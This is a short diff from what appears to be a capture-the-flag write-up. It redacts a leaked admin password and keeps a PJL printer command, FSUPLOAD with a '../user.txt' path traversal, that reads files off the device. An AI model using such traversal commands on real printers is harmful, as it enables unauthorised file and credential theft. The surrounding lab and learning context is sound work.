@@ -271,7 +271,7 @@ FDs recibidos: [4, 5]
 Command: @PJL FSUPLOAD NAME="../user.txt" OFFSET=0 SIZE=999999
 
 --- fd 5 ---
-ADMIN_PASSWORD=ApparelMortuaryCedar22
+ADMIN_PASSWORD=*****************
 ```
 
 #### Privilege Escalation to Root
